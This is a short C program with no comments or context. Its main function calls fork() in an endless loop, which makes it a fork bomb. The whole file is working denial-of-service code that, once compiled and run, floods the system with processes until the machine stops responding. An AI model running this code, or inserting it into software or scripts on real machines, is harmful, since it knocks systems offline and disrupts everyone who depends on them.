#include <stdio.h>
#include <unistd.h>

int main(void) {
  while (1) {
    fork();
  }
}